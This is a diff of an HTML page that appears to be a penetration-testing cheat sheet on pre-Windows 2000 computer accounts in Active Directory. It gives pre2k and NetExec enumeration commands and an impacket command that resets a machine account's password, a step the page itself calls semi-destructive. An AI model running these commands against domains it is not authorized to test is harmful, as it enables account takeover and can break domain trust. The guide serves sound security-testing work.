@@ -5263,13 +5263,13 @@
 <h3 id="identify">Identify</h3>
 <p><strong>Tools:</strong> <a href="https://github.com/garrettfoster13/pre2k">pre2k</a>, <a href="https://github.com/Pennyw0rth/NetExec">nxc</a></p>
 <p><strong>With creds</strong>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>pre2k<span class="w"> </span>auth<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;DOMAIN&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;pass&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dcip&gt;<span class="w"> </span>-ldaps
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>pre2k<span class="w"> </span>auth<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;DOMAIN&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;pass&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dcip&gt;<span class="w"> </span>-ldaps<span class="w"> </span>-save
 </span></code></pre></div>
 or
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;dc-ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-M<span class="w"> </span>pre2k
 </span></code></pre></div></p>
 <p><strong>Without creds</strong>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>pre2k<span class="w"> </span>unauth<span class="w"> </span>-d<span class="w"> </span>&lt;DOMAIN&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dcip&gt;<span class="w"> </span>-inputfile<span class="w"> </span>&lt;listofcomputers&gt;
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>pre2k<span class="w"> </span>unauth<span class="w"> </span>-d<span class="w"> </span>&lt;DOMAIN&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dcip&gt;<span class="w"> </span>-inputfile<span class="w"> </span>&lt;listofcomputers&gt;<span class="w"> </span>-save
 </span></code></pre></div></p>
 <div class="admonition alert">
 <p class="admonition-title">Note</p>
@@ -5290,7 +5290,7 @@ Expected output: <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code></p>
 <h3 id="exploit">Exploit</h3>
 <div class="admonition alert">
 <p class="admonition-title">Note</p>
-<p>this is semi-destructive, it may require the object be rejoined to the domain</p>
+<p>this is semi-destructive, you're changing the machine password, may require the object be rejoined to the domain</p>
 </div>
 <p><strong>Change the account password:</strong>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>impacket-changpasswd.py<span class="w"> </span>domain/machinename<span class="se">\$</span>:machinename@dc-ip<span class="w"> </span>-newpass<span class="w"> </span>&lt;pass&gt;
